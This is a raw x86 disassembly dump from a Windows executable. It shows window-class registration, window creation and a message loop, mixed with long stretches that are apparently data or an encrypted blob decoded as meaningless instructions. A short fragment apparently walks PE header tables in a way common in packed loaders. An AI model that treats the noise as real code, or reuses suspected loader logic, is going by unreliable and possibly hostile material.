  41ca3c:	fsub   DWORD PTR [esi+ebp*1+0x64]
  41ca40:	out    0xfe,al
  41ca42:	lods   al,BYTE PTR ds:[esi]
  41ca43:	inc    edx
  41ca44:	inc    ebx
  41ca45:	add    BYTE PTR [eax],al
  41ca47:	add    BYTE PTR [ecx+0x40],al
  41ca4a:	bound  esp,QWORD PTR [esi+0x0]
  41ca4d:	inc    eax
  41ca4e:	add    eax,0x5400000
  41ca53:	inc    ecx
  41ca54:	inc    eax
  41ca55:	inc    eax
  41ca56:	bound  esp,QWORD PTR ds:0x25050043
  41ca5c:	inc    ecx
  41ca5d:	inc    ebx
  41ca5e:	inc    eax
  41ca5f:	test   BYTE PTR [eax+0x0],al
  41ca62:	bound  ebx,QWORD PTR [eax+0x62]
  41ca65:	inc    ecx
  41ca66:	inc    eax
  41ca67:	bound  eax,QWORD PTR [ecx]
  41ca69:	and    cl,dl
  41ca6b:	inc    eax
  41ca6c:	inc    esp
  41ca6d:	adc    eax,0x8010d034
  41ca72:	inc    esp
  41ca73:	pusha  
  41ca74:	sub    al,0xc9
  41ca76:	mov    BYTE PTR [ebp+0x40],al
  41ca79:	xchg   ebx,eax
  41ca7a:	xchg   ecx,eax
  41ca7b:	inc    edx
  41ca7c:	je     0x41cacf
  41ca7e:	jnp    0x41cabd
  41ca80:	sub    BYTE PTR [ecx-0x79],al
  41ca83:	inc    eax
  41ca84:	push   0x135e4241
  41ca89:	adc    edx,DWORD PTR [ebp-0x13876eb]
  41ca8f:	test   al,0x34
  41ca91:	and    al,0x78
  41ca93:	cs inc esp
  41ca95:	mov    BYTE PTR [edi+0x62],cl
  41ca98:	xor    bh,0x53
  41ca9b:	dec    esi
  41ca9c:	sub    al,0x62
  41ca9e:	dec    eax
  41ca9f:	cli    
  41caa0:	lds    ebp,FWORD PTR [eax+edx*1]
  41caa3:	bound  eax,QWORD PTR [eax+0x41]
  41caa6:	and    eax,0x40000500
  41caab:	inc    ebx
  41caac:	add    eax,0x40624041
  41cab1:	inc    ebx
  41cab2:	add    eax,0x43402541
  41cab7:	bound  eax,QWORD PTR [eax+0x43]
  41caba:	int3   
  41cabb:	inc    eax
  41cabc:	bound  eax,QWORD PTR [eax]
  41cabe:	inc    ecx
  41cabf:	inc    eax
  41cac0:	inc    eax
  41cac1:	add    eax,0x72400905
  41cac6:	cs adc eax,0x11664862
  41cacc:	aaa    
  41cacd:	int    0x35
  41cacf:	retf   
  41cad0:	mov    edi,0x405f3e46
  41cad5:	and    BYTE PTR [eax+0x4c],dl
  41cad8:	sub    al,BYTE PTR [edx-0x36]
  41cadb:	mov    ecx,0xc502fe68
  41cae0:	adc    BYTE PTR [eax],dh
  41cae2:	inc    ebx
  41cae3:	inc    eax
  41cae4:	inc    eax
  41cae5:	inc    esp
  41cae6:	jnp    0x41cb1c
  41cae8:	lods   al,BYTE PTR ds:[esi]
  41cae9:	jp     0x41cb40
  41caeb:	bound  eax,QWORD PTR [eax+0x25]
  41caee:	add    BYTE PTR [esi+0x40],ah
  41caf1:	add    eax,0x40404143
  41caf6:	inc    ebx
  41caf7:	add    BYTE PTR [eax],al
  41caf9:	add    BYTE PTR [edx-0x34],ah
  41cafc:	inc    eax
  41cafd:	add    eax,0x40004041
  41cb02:	inc    ecx
  41cb03:	int3   
  41cb04:	add    BYTE PTR [ebx-0x7c],al
  41cb07:	add    eax,0x5406240
  41cb0c:	bound  esi,QWORD PTR [ebx]
  41cb0e:	pusha  
  41cb0f:	sub    al,0xb0
  41cb11:	mov    ah,0x41
  41cb13:	push   ds
  41cb14:	call   0xad9c:0x43705649
  41cb1b:	test   al,0xae
  41cb1d:	adc    eax,0x62984840
  41cb22:	xor    BYTE PTR [edx],dl
  41cb24:	dec    eax
  41cb25:	mov    edi,0x92d49d01
  41cb2a:	push   eax
  41cb2b:	dec    edi
  41cb2c:	lds    edi,FWORD PTR [ecx]
  41cb2e:	and    al,0x44
  41cb30:	cmp    ebp,eax
  41cb32:	cmp    BYTE PTR [edx+0x4f],ah
  41cb35:	stc    
  41cb36:	inc    eax
  41cb37:	sub    al,0x66
  41cb39:	push   ecx
  41cb3a:	inc    eax
  41cb3b:	bound  ebx,QWORD PTR [eax+0x41]
  41cb3e:	add    eax,0x40404340
  41cb43:	inc    ebx
  41cb44:	inc    eax
  41cb45:	test   BYTE PTR [eax],al
  41cb47:	add    eax,0x40624041
  41cb4c:	inc    eax
  41cb4d:	add    BYTE PTR [edx+0x5],ah
  41cb50:	inc    ebx
  41cb51:	add    BYTE PTR [eax+0x78],al
  41cb54:	inc    ecx
  41cb55:	add    BYTE PTR [eax+0x41],bl
  41cb58:	bound  esp,QWORD PTR [esi]
  41cb5a:	jb     0x41cadc
  41cb5c:	and    DWORD PTR [edi],ebp
  41cb5e:	outs   dx,BYTE PTR ds:[esi]
  41cb5f:	xor    esi,edi
  41cb61:	mov    al,0x20
  41cb63:	cs cli 
  41cb65:	es aad 0x1f
  41cb68:	dec    edi
  41cb69:	bound  esp,QWORD PTR [edx-0x57]
  41cb6c:	cmp    BYTE PTR [eax+0x20],al
  41cb6f:	sub    BYTE PTR [edx+0x42],al
  41cb72:	sub    BYTE PTR [ebx],ah
  41cb74:	shl    BYTE PTR [eax-0x2],cl
  41cb77:	in     al,dx
  41cb78:	pop    ss
  41cb79:	sub    dh,BYTE PTR [edx+edx*8]
  41cb7c:	mov    bl,0x4
  41cb7e:	inc    esp
  41cb7f:	popa   
  41cb80:	nop
  41cb81:	inc    eax
  41cb82:	xor    al,0x0
  41cb84:	push   ebx
  41cb85:	inc    ecx
  41cb86:	sub    al,0x29
  41cb88:	push   0xb304802a
  41cb8d:	sbb    al,0x6c
  41cb8f:	adc    eax,DWORD PTR [si+0x40]
  41cb93:	test   BYTE PTR [eax],al
  41cb95:	int3   
  41cb96:	bound  eax,QWORD PTR ds:0xcc840f41
  41cb9c:	inc    ebx
  41cb9d:	add    BYTE PTR [eax+0x0],al
  41cba0:	inc    eax
  41cba1:	inc    eax
  41cba2:	inc    eax
  41cba3:	int3   
  41cba4:	add    BYTE PTR ds:0x62404341,al
  41cbaa:	pop    eax
  41cbab:	add    BYTE PTR [ebx+0x40],al
  41cbae:	bound  ecx,QWORD PTR [edi]
  41cbb0:	inc    eax
  41cbb1:	(bad)
  41cbb4:	inc    eax
  41cbb5:	int    0x8c
  41cbb7:	cmp    al,0x2a
  41cbb9:	push   eax
  41cbba:	fidiv  DWORD PTR [ebx+eiz*1-0x5f9d578a]
  41cbc1:	inc    ebx
  41cbc2:	and    BYTE PTR [eax],dh
  41cbc4:	push   esi
  41cbc5:	(bad)  
  41cbc6:	adc    BYTE PTR [ebp+ecx*1+0x40ea4e45],bh
  41cbcd:	inc    esp
  41cbce:	dec    eax
  41cbcf:	adc    eax,0x33a62cc9
  41cbd4:	sub    DWORD PTR [edx+eax*2],ebp
  41cbd7:	push   edi
  41cbd8:	loopne 0x41cbc2
  41cbda:	add    BYTE PTR [eax],al
  41cbdc:	inc    eax
  41cbdd:	inc    eax
  41cbde:	cmovno eax,DWORD PTR ds:0x40056243
  41cbe5:	int3   
  41cbe6:	add    ah,cl
  41cbe8:	inc    eax
  41cbe9:	inc    eax
  41cbea:	bound  eax,QWORD PTR [ecx+0x0]
  41cbed:	add    BYTE PTR [edi],cl
  41cbef:	inc    ebx
  41cbf0:	inc    eax
  41cbf1:	inc    eax
  41cbf2:	add    BYTE PTR [ecx+0x43],al
  41cbf5:	add    eax,0x40256240
  41cbfa:	bound  eax,QWORD PTR [eax]
  41cbfc:	fistp  WORD PTR [ebp+0x163f6a40]
  41cc02:	or     eax,0x2c571493
  41cc07:	lds    esp,FWORD PTR [eax-0x7fc734ae]
  41cc0d:	rol    DWORD PTR [eax+0x20],cl
  41cc10:	fs jnp 0x41cbb7
  41cc13:	retf   0x671e
  41cc16:	cs (bad) 
  41cc18:	out    0xc1,al
  41cc1a:	add    eax,0x40d3aa63
  41cc1f:	inc    esp
  41cc20:	cmp    cl,ah
  41cc22:	leave  
  41cc23:	inc    ebp
  41cc24:	es cmp al,0xb6
  41cc27:	sub    al,0x4c
  41cc29:	dec    eax
  41cc2a:	in     al,0x2a
  41cc2c:	clc    
  41cc2d:	xchg   ebx,eax
  41cc2e:	add    eax,0x4140cc00
  41cc33:	inc    eax
  41cc34:	inc    ebx
  41cc35:	bound  esp,QWORD PTR ds:0x41400043
  41cc3b:	add    BYTE PTR [eax],al
  41cc3d:	add    eax,0x43624062
  41cc42:	inc    ecx
  41cc43:	inc    eax
  41cc44:	inc    eax
  41cc45:	inc    eax
  41cc46:	add    eax,0x40624340
  41cc4b:	add    eax,0x40664140
  41cc50:	inc    eax
  41cc51:	push   0x174d45ec
  41cc56:	adc    esi,DWORD PTR [esi]
  41cc58:	inc    eax
  41cc59:	aad    0x2d
  41cc5b:	pop    ebp
  41cc5c:	adc    eax,0x3393c04a
  41cc61:	adc    DWORD PTR [eax+0x52],esp
  41cc64:	les    esp,FWORD PTR [edx-0x5f]
  41cc67:	sbb    BYTE PTR [esi+edi*8+0x3c],bl
  41cc6b:	leave  
  41cc6c:	bound  ecx,QWORD PTR [esi]
  41cc6e:	ins    DWORD PTR es:[edi],dx
  41cc6f:	ja     0x41ccb1
  41cc71:	inc    esp
  41cc72:	in     al,dx
  41cc73:	ins    BYTE PTR es:[edi],dx
  41cc74:	ins    BYTE PTR es:[edi],dx
  41cc75:	xor    BYTE PTR ds:0xc42c2551,dl
  41cc7b:	popf   
  41cc7c:	adc    BYTE PTR [ebx+0x43],ah
  41cc7f:	add    BYTE PTR ds:0x41107840,al
  41cc85:	bound  eax,QWORD PTR [eax+0x40]
  41cc88:	sldt   WORD PTR [eax-0x34]
  41cc8c:	js     0x41ccf0
  41cc8e:	add    eax,0x40664143
  41cc93:	inc    ebx
  41cc94:	add    BYTE PTR [ecx+0x5],al
  41cc97:	js     0x41ccd9
  41cc99:	bound  eax,QWORD PTR [eax+0x0]
  41cc9c:	inc    eax
  41cc9d:	bound  ebx,QWORD PTR [ebx]
  41cc9f:	inc    eax
  41cca0:	bound  ax,DWORD PTR gs:[ebp+0x74]
  41cca5:	cmp    al,0xc4
  41cca7:	xor    BYTE PTR [esi-0x2c],dl
  41ccaa:	push   ss
  41ccab:	ds fs push 0xf2894014
  41ccb2:	sub    BYTE PTR [esi],cl
  41ccb4:	bound  eax,QWORD PTR ds:0xc4446025
  41ccba:	dec    eax
  41ccbb:	test   al,0x5
  41ccbd:	scas   eax,DWORD PTR es:[edi]
  41ccbe:	inc    ecx
  41ccbf:	inc    ebx
  41ccc0:	inc    eax
  41ccc1:	inc    eax
  41ccc2:	add    eax,0x434162
  41ccc7:	inc    eax
  41ccc8:	add    BYTE PTR [edx+0x5],ah
  41cccb:	inc    eax
  41cccc:	adc    BYTE PTR [edx+0x40],ah
  41cccf:	inc    ebx
  41ccd0:	inc    ecx
  41ccd1:	add    eax,0x4340
  41ccd6:	add    eax,0x404162
  41ccdb:	add    BYTE PTR [eax+0x43],al
  41ccde:	inc    eax
  41ccdf:	add    eax,0x4f2c60be
  41cce4:	or     eax,0x50508711
  41cce9:	inc    eax
  41ccea:	fs jne 0x41ccb6
  41cced:	mov    al,ds:0x32336e1b
  41ccf2:	(bad)
  41ccf5:	or     eax,0x4042904e
  41ccfa:	dec    esi
  41ccfb:	inc    eax
  41ccfc:	add    BYTE PTR [eax],al
  41ccfe:	inc    ecx
  41ccff:	inc    ebx
  41cd00:	add    eax,0x41784062
  41cd05:	inc    eax
  41cd06:	inc    eax
  41cd07:	add    BYTE PTR [edi],cl
  41cd09:	bound  eax,QWORD PTR [ebx+0x0]
  41cd0c:	add    eax,0x25006240
  41cd11:	inc    eax
  41cd12:	add    eax,0x40254143
  41cd17:	add    eax,0x65620000
  41cd1c:	retf   
  41cd1d:	inc    edx
  41cd1e:	gs inc edx
  41cd20:	push   ebp
  41cd21:	sub    dl,bh
  41cd23:	dec    edi
  41cd24:	push   eax
  41cd25:	add    BYTE PTR [ebp+eiz*1+0xd],bh
  41cd29:	fadd   DWORD PTR [esp+ebx*8+0x43]
  41cd2d:	call   0x4099498a
  41cd32:	sub    al,0x32
  41cd34:	inc    ebx
  41cd35:	add    BYTE PTR [eax],al
  41cd37:	add    BYTE PTR [ecx+0x40],al
  41cd3a:	bound  esp,QWORD PTR [esi+0x0]
  41cd3d:	inc    eax
  41cd3e:	add    eax,0x5400000
  41cd43:	inc    ecx
  41cd44:	inc    eax
  41cd45:	inc    eax
  41cd46:	bound  esp,QWORD PTR ds:0x25050043
  41cd4c:	inc    ecx
  41cd4d:	inc    ebx
  41cd4e:	inc    eax
  41cd4f:	test   BYTE PTR [eax+0x0],al
  41cd52:	bound  ebx,QWORD PTR [eax+0x62]
  41cd55:	inc    ecx
  41cd56:	inc    eax
  41cd57:	mov    ch,0x63
  41cd59:	(bad)  
  41cd5a:	(bad)  
  41cd5b:	sbb    BYTE PTR [edx+0x62],cl
  41cd5e:	jge    0x41cd9c
  41cd60:	mov    edx,0x40f1aec4
  41cd65:	jo     0x41cd0f
  41cd67:	cmp    DWORD PTR [eax+0x4d504a4f],ecx
  41cd6d:	or     DWORD PTR [ecx],edx
  41cd6f:	and    BYTE PTR [eax+eax*4+0xa],ch
  41cd73:	xor    DWORD PTR [eax+0x55],ecx
  41cd76:	dec    esp
  41cd77:	jno    0x41cdb9
  41cd79:	lds    edx,FWORD PTR [edx+0x77]
  41cd7c:	inc    eax
  41cd7d:	inc    esp
  41cd7e:	or     BYTE PTR [eax+0x73984165],cl
  41cd84:	gs sub al,0xcb
  41cd87:	arpl   WORD PTR [edx+0x38454337],di
  41cd8d:	pusha  
  41cd8e:	adc    BYTE PTR [edx+0x40],ah
  41cd91:	inc    ecx
  41cd92:	and    eax,0x40000500
  41cd97:	inc    ebx
  41cd98:	add    eax,0x40624041
  41cd9d:	inc    ebx
  41cd9e:	add    eax,0x43402541
  41cda3:	bound  eax,QWORD PTR [eax+0x43]
  41cda6:	int3   
  41cda7:	inc    eax
  41cda8:	bound  eax,QWORD PTR [eax]
  41cdaa:	inc    ecx
  41cdab:	inc    eax
  41cdac:	inc    eax
  41cdad:	add    eax,0x30fc4c05
  41cdb2:	cwde   
  41cdb3:	add    eax,0x50240f1
  41cdb8:	dec    sp
  41cdba:	bound  esp,QWORD PTR [ebp+0x57]
  41cdbd:	setge  BYTE PTR [esi+0x63]
  41cdc1:	call   0x40a49e06
  41cdc6:	and    eax,0x5406600
  41cdcb:	inc    ebx
  41cdcc:	inc    ecx
  41cdcd:	inc    eax
  41cdce:	inc    eax
  41cdcf:	inc    ebx
  41cdd0:	add    BYTE PTR [eax],al
  41cdd2:	add    BYTE PTR [edx-0x34],ah
  41cdd5:	inc    eax
  41cdd6:	add    eax,0x40004041
  41cddb:	inc    ecx
  41cddc:	int3   
  41cddd:	add    BYTE PTR [ebx-0x7c],al
  41cde0:	add    eax,0x5406240
  41cde5:	bound  esi,QWORD PTR [edi+0x40]
  41cde8:	inc    esp
  41cde9:	retf   0xddc
  41cdec:	pop    esi
  41cded:	out    0xbf,eax
  41cdef:	adc    al,0x2c
  41cdf1:	in     al,0x42
  41cdf3:	pushf  
  41cdf4:	jg     0x41cda0
  41cdf6:	mov    al,BYTE PTR [eax+0x5e]
  41cdf9:	bound  edx,QWORD PTR [eax]
  41cdfb:	arpl   WORD PTR [eax+0xb1f390b],bp
  41ce01:	xchg   ecx,eax
  41ce02:	int3   
  41ce03:	int3   
  41ce04:	int3   
  41ce05:	int3   
  41ce06:	int3   
  41ce07:	int3   
  41ce08:	int3   
  41ce09:	int3   
  41ce0a:	int3   
  41ce0b:	int3   
  41ce0c:	int3   
  41ce0d:	int3   
  41ce0e:	int3   
  41ce0f:	int3   
  41ce10:	push   ebp
  41ce11:	mov    ebp,esp
  41ce13:	sub    esp,0x30
  41ce16:	mov    DWORD PTR [ebp-0x30],0x30
  41ce1d:	mov    DWORD PTR [ebp-0x18],0x0
  41ce24:	mov    DWORD PTR [ebp-0x4],0x0
  41ce2b:	mov    DWORD PTR [ebp-0x10],0x6
  41ce32:	mov    DWORD PTR [ebp-0xc],0x0
  41ce39:	mov    DWORD PTR [ebp-0x8],0x426d64
  41ce40:	mov    DWORD PTR [ebp-0x2c],0x3
  41ce47:	push   0x7f00
  41ce4c:	push   0x0
  41ce4e:	call   DWORD PTR ds:0x421068
  41ce54:	mov    DWORD PTR [ebp-0x14],eax
  41ce57:	push   0x66
  41ce59:	mov    eax,DWORD PTR [ebp+0x8]
  41ce5c:	push   eax
  41ce5d:	call   DWORD PTR ds:0x42108c
  41ce63:	mov    DWORD PTR [ebp-0x28],0x41fb70
  41ce6a:	mov    DWORD PTR [ebp-0x24],0x0
  41ce71:	mov    DWORD PTR [ebp-0x20],0x0
  41ce78:	mov    ecx,DWORD PTR [ebp+0x8]
  41ce7b:	mov    DWORD PTR [ebp-0x1c],ecx
  41ce7e:	call   DWORD PTR ds:0x421010
  41ce84:	mov    ds:0x42725c,eax
  41ce89:	push   0x7f00
  41ce8e:	mov    edx,DWORD PTR [ebp-0x1c]
  41ce91:	push   edx
  41ce92:	call   DWORD PTR ds:0x421074
  41ce98:	mov    DWORD PTR [ebp-0x4],eax
  41ce9b:	push   0x7f00
  41cea0:	mov    eax,DWORD PTR [ebp+0x8]
  41cea3:	push   eax
  41cea4:	call   DWORD PTR ds:0x421074
  41ceaa:	mov    DWORD PTR [ebp-0x18],eax
  41cead:	lea    ecx,[ebp-0x30]
  41ceb0:	push   ecx
  41ceb1:	call   DWORD PTR ds:0x421078
  41ceb7:	mov    esp,ebp
  41ceb9:	pop    ebp
  41ceba:	ret    
  41cebb:	int3   
  41cebc:	int3   
  41cebd:	int3   
  41cebe:	int3   
  41cebf:	int3   
  41cec0:	mov    eax,DWORD PTR [edi]
  41cec2:	mov    ecx,DWORD PTR [ebp-0x4]
  41cec5:	add    ecx,eax
  41cec7:	push   DWORD PTR [ebp+0xc]
  41ceca:	push   ecx
  41cecb:	call   0x401170
  41ced0:	ret    
  41ced1:	int3   
  41ced2:	int3   
  41ced3:	int3   
  41ced4:	int3   
  41ced5:	int3   
  41ced6:	int3   
  41ced7:	int3   
  41ced8:	int3   
  41ced9:	int3   
  41ceda:	int3   
  41cedb:	int3   
  41cedc:	int3   
  41cedd:	int3   
  41cede:	int3   
  41cedf:	int3   
  41cee0:	push   ebx
  41cee1:	mov    ebx,esi
  41cee3:	mov    eax,DWORD PTR [ebx]
  41cee5:	jmp    0x413960
  41ceea:	pop    ebx
  41ceeb:	call   0x40caa0
  41cef0:	ret    
  41cef1:	int3   
  41cef2:	int3   
  41cef3:	int3   
  41cef4:	int3   
  41cef5:	int3   
  41cef6:	int3   
  41cef7:	int3   
  41cef8:	int3   
  41cef9:	int3   
  41cefa:	int3   
  41cefb:	int3   
  41cefc:	int3   
  41cefd:	int3   
  41cefe:	int3   
  41ceff:	int3   
  41cf00:	push   ebp
  41cf01:	mov    ebp,esp
  41cf03:	push   ecx
  41cf04:	mov    eax,DWORD PTR [ebp+0x8]
  41cf07:	mov    ds:0x427254,eax
  41cf0c:	mov    DWORD PTR ds:0x42724c,0x0
  41cf16:	mov    ecx,DWORD PTR [ebp+0x8]
  41cf19:	mov    DWORD PTR ds:0x4253d7,ecx
  41cf1f:	push   0x0
  41cf21:	mov    edx,DWORD PTR [ebp+0x8]
  41cf24:	push   edx
  41cf25:	push   0x0
  41cf27:	push   0x0
  41cf29:	push   0x328
  41cf2e:	push   0x4b6
  41cf33:	push   0x0
  41cf35:	push   0x0
  41cf37:	push   0xcf0000
  41cf3c:	push   0x426d50
  41cf41:	push   0x426d64
  41cf46:	push   0x0
  41cf48:	call   DWORD PTR ds:0x421060
  41cf4e:	mov    DWORD PTR [ebp-0x4],eax
  41cf51:	cmp    DWORD PTR [ebp-0x4],0x0
  41cf55:	jne    0x41cf5b
  41cf57:	xor    eax,eax
  41cf59:	jmp    0x41cf60
  41cf5b:	mov    eax,0x1
  41cf60:	mov    esp,ebp
  41cf62:	pop    ebp
  41cf63:	ret    
  41cf64:	int3   
  41cf65:	int3   
  41cf66:	int3   
  41cf67:	int3   
  41cf68:	int3   
  41cf69:	int3   
  41cf6a:	int3   
  41cf6b:	int3   
  41cf6c:	int3   
  41cf6d:	int3   
  41cf6e:	int3   
  41cf6f:	int3   
  41cf70:	mov    esi,DWORD PTR [eax+0x60]
  41cf73:	mov    eax,DWORD PTR [ebp-0x4]
  41cf76:	add    eax,esi
  41cf78:	add    eax,0x20
  41cf7b:	mov    esi,eax
  41cf7d:	mov    edi,DWORD PTR [esi]
  41cf7f:	sub    esi,0xc
  41cf82:	mov    eax,DWORD PTR [esi]
  41cf84:	add    edi,DWORD PTR [ebp-0x4]
  41cf87:	mov    DWORD PTR [ebp-0xc],eax
  41cf8a:	sub    esi,0x14
  41cf8d:	xor    edx,edx
  41cf8f:	mov    ebx,DWORD PTR [ebp+0xc]
  41cf92:	ret    
  41cf93:	int3   
  41cf94:	int3   
  41cf95:	int3   
  41cf96:	int3   
  41cf97:	int3   
  41cf98:	int3   
  41cf99:	int3   
  41cf9a:	int3   
  41cf9b:	int3   
  41cf9c:	int3   
  41cf9d:	int3   
  41cf9e:	int3   
  41cf9f:	int3   
  41cfa0:	push   ebp
  41cfa1:	mov    ebp,esp
  41cfa3:	sub    esp,0x34
  41cfa6:	mov    eax,DWORD PTR [ebp+0x8]
  41cfa9:	push   eax
  41cfaa:	call   0x41ce10
  41cfaf:	add    esp,0x4
  41cfb2:	push   0x0
  41cfb4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cfb7:	push   ecx
  41cfb8:	call   0x41cf00
  41cfbd:	add    esp,0x8
  41cfc0:	test   eax,eax
  41cfc2:	setne  dl
  41cfc5:	mov    BYTE PTR [ebp-0x2d],dl
  41cfc8:	push   0x0
  41cfca:	push   0x0
  41cfcc:	push   0x0
  41cfce:	lea    eax,[ebp-0x2c]
  41cfd1:	push   eax
  41cfd2:	call   DWORD PTR ds:0x42107c
  41cfd8:	test   eax,eax
  41cfda:	je     0x41d008
  41cfdc:	lea    ecx,[ebp-0x2c]
  41cfdf:	push   ecx
  41cfe0:	mov    edx,DWORD PTR [ebp-0x10]
  41cfe3:	push   edx
  41cfe4:	mov    eax,DWORD PTR [ebp-0x2c]
  41cfe7:	push   eax
  41cfe8:	call   DWORD PTR ds:0x421080
  41cfee:	test   eax,eax
  41cff0:	jne    0x41d006
  41cff2:	lea    ecx,[ebp-0x2c]
  41cff5:	push   ecx
  41cff6:	call   DWORD PTR ds:0x421084
  41cffc:	lea    edx,[ebp-0x2c]
  41cfff:	push   edx
  41d000:	call   DWORD PTR ds:0x421088
  41d006:	jmp    0x41cfc8
  41d008:	movzx  eax,BYTE PTR [ebp-0x2d]
  41d00c:	test   eax,eax
  41d00e:	jne    0x41d021
  41d010:	push   DWORD PTR ds:0x42724c
  41d016:	inc    ecx
  41d017:	pop    eax
  41d018:	call   0x40f1a0
  41d01d:	xor    eax,eax
  41d01f:	jmp    0x41d02a
  41d021:	call   DWORD PTR ds:0x421000
  41d027:	mov    eax,DWORD PTR [ebp-0x24]
  41d02a:	mov    esp,ebp
  41d02c:	pop    ebp
  41d02d:	ret    0x10
  41d030:	arpl   WORD PTR [edx+0x40],ax
  41d033:	inc    eax
  41d034:	cmp    al,0x1
  41d036:	xor    BYTE PTR [eax],al
  41d038:	add    BYTE PTR [eax+0x40],al
  41d03b:	cmovno eax,DWORD PTR ds:0x40056243
  41d042:	int3   
  41d043:	add    ah,cl
  41d045:	inc    eax
  41d046:	inc    eax
  41d047:	bound  eax,QWORD PTR [ecx+0x0]
  41d04a:	add    BYTE PTR [edi],cl
  41d04c:	inc    ebx
  41d04d:	inc    eax
  41d04e:	inc    eax
  41d04f:	add    BYTE PTR [ecx+0x43],al
  41d052:	add    eax,0x40256240
  41d057:	bound  eax,QWORD PTR [eax]
  41d059:	aas    
  41d05a:	pop    esp
  41d05b:	push   esp
  41d05c:	inc    eax
  41d05d:	add    DWORD PTR cs:[ebx+ebp*2+0x403008d9],ebp
  41d065:	dec    ebp
  41d066:	adc    eax,0x522b9062
  41d06b:	xchg   esi,eax
  41d06c:	or     al,0xc0
  41d06e:	or     BYTE PTR [esi+edx*8-0x3c],bl
  41d072:	add    eax,0x232340c4
  41d077:	dec    esp
  41d078:	frstor [edx+0x63]
  41d07b:	dec    edi
  41d07c:	add    eax,0x4140cc00
  41d081:	inc    eax
  41d082:	inc    ebx
  41d083:	bound  esp,QWORD PTR ds:0x41400043
  41d089:	add    BYTE PTR [eax],al
  41d08b:	add    eax,0x43624062
  41d090:	inc    ecx
  41d091:	inc    eax
  41d092:	inc    eax
  41d093:	inc    eax
  41d094:	add    eax,0x40624340
  41d099:	add    eax,0x40664140
  41d09e:	or     eax,0x1855b64d
  41d0a3:	inc    ebp
  41d0a4:	cmp    eax,0xfc3404c
  41d0a9:	retf   
  41d0aa:	xor    al,0xe0
  41d0ac:	bound  ebp,QWORD PTR [ebx-0x7ff7aec]
  41d0b2:	pop    ebp
  41d0b3:	push   0x25406633
  41d0b8:	xor    al,BYTE PTR [ebx+0x0]
  41d0bb:	add    eax,0x41107840
  41d0c0:	bound  eax,QWORD PTR [eax+0x40]
  41d0c3:	sldt   WORD PTR [eax-0x34]
  41d0c7:	js     0x41d12b
  41d0c9:	add    eax,0x40664143
  41d0ce:	inc    ebx
  41d0cf:	add    BYTE PTR [ecx+0x5],al
  41d0d2:	js     0x41d114
  41d0d4:	bound  eax,QWORD PTR [eax+0x0]
  41d0d7:	inc    eax
  41d0d8:	bound  ecx,QWORD PTR [eax+0x8a81a0d]
  41d0de:	ret    0xc56a
  41d0e1:	test   al,0x7b
  41d0e3:	jno    0x41d0f6
  41d0e5:	inc    eax
  41d0e6:	xor    al,BYTE PTR [ecx]
  41d0e8:	dec    edi
  41d0e9:	adc    bh,BYTE PTR [esp+eiz*2+0x1aeb6eb4]
  41d0f0:	push   eax
  41d0f1:	inc    ecx
  41d0f2:	or     eax,0xc1400d21
  41d0f7:	and    DWORD PTR [edx+0x41904178],0x5404043
  41d101:	bound  eax,QWORD PTR [ecx+0x43]
  41d104:	add    BYTE PTR [eax+0x0],al
  41d107:	bound  eax,QWORD PTR ds:0x40621040
  41d10d:	inc    ebx
  41d10e:	inc    ecx
  41d10f:	add    eax,0x4340
  41d114:	add    eax,0x404162
  41d119:	add    BYTE PTR [eax+0x43],al
  41d11c:	inc    eax
  41d11d:	add    eax,0x442f0ecd
  41d122:	ret    
  41d123:	enter  0x666d,0x43
  41d127:	inc    eax
  41d128:	leave  
  41d129:	add    BYTE PTR [ecx+0x62],dl
  41d12c:	and    BYTE PTR [esi+0x28],ch
  41d12f:	cmovns esp,DWORD PTR [ebx]
  41d132:	inc    ebx
  41d133:	loopne 0x41d175
  41d135:	add    BYTE PTR [eax],al
  41d137:	inc    ecx
  41d138:	inc    ebx
  41d139:	add    eax,0x41784062
  41d13e:	inc    eax
  41d13f:	inc    eax
  41d140:	add    BYTE PTR [edi],cl
  41d142:	bound  eax,QWORD PTR [ebx+0x0]
  41d145:	add    eax,0x25006240
  41d14a:	inc    eax
  41d14b:	add    eax,0x40254143
  41d150:	add    eax,0x5b620000
  41d155:	test   al,0x8c
  41d157:	inc    eax
  41d158:	ret    
  41d159:	repnz add DWORD PTR ds:0x94145a9,ecx
  41d160:	push   edi
  41d161:	(bad)  
  41d162:	and    al,0xcb
  41d164:	test   al,0x16
  41d166:	in     al,dx
  41d167:	inc    eax
  41d168:	ret    
  41d169:	inc    ebx
  41d16a:	add    BYTE PTR [eax],al
  41d16c:	add    BYTE PTR [ecx+0x40],al
  41d16f:	bound  esp,QWORD PTR [esi+0x0]
  41d172:	inc    eax
  41d173:	add    eax,0x5400000
  41d178:	inc    ecx
  41d179:	inc    eax
  41d17a:	inc    eax
  41d17b:	bound  esp,QWORD PTR ds:0x25050043
  41d181:	inc    ecx
  41d182:	inc    ebx
  41d183:	inc    eax
  41d184:	test   BYTE PTR [eax+0x0],al
  41d187:	bound  ebx,QWORD PTR [eax+0x62]
  41d18a:	inc    ecx
  41d18b:	inc    eax
  41d18c:	inc    ecx
  41d18d:	(bad)  
  41d18e:	out    dx,eax
  41d18f:	add    eax,0x1a14a913
  41d194:	and    BYTE PTR ds:0x4f62c923,0x40
  41d19b:	(bad)  
  41d19e:	inc    esp
  41d19f:	lods   al,BYTE PTR ds:[esi]
  41d1a0:	leave  
  41d1a1:	xor    eax,0x632d3903
  41d1a6:	rol    BYTE PTR [ebx-0x57],0x46
  41d1aa:	inc    eax
  41d1ab:	(bad)  
  41d1ac:	(bad)  
  41d1ae:	inc    ecx
  41d1af:	adc    eax,0xff15ecb0
  41d1b4:	test   ah,bl
  41d1b6:	int3   
  41d1b7:	sub    BYTE PTR [ebp+0x41406210],ch
  41d1bd:	and    eax,0x40000500
  41d1c2:	inc    ebx
  41d1c3:	add    eax,0x40624041
  41d1c8:	inc    ebx
  41d1c9:	add    eax,0x43402541
  41d1ce:	bound  eax,QWORD PTR [eax+0x43]
  41d1d1:	int3   
  41d1d2:	inc    eax
  41d1d3:	bound  eax,QWORD PTR [eax]
  41d1d5:	inc    ecx
  41d1d6:	inc    eax
  41d1d7:	inc    eax
  41d1d8:	add    eax,0x6d406c05
  41d1dd:	push   es
  41d1de:	les    ebp,FWORD PTR [edx]
  41d1e0:	es aas 
  41d1e2:	mov    ch,0x12
  41d1e4:	(bad)  
  41d1e5:	cmp    ecx,DWORD PTR [edi-0x7f]
  41d1e8:	sub    al,0x4d
  41d1ea:	dec    eax
  41d1eb:	inc    eax
  41d1ec:	add    dl,BYTE PTR [eax+0x3c62a891]
  41d1f2:	cs adc al,0xc1
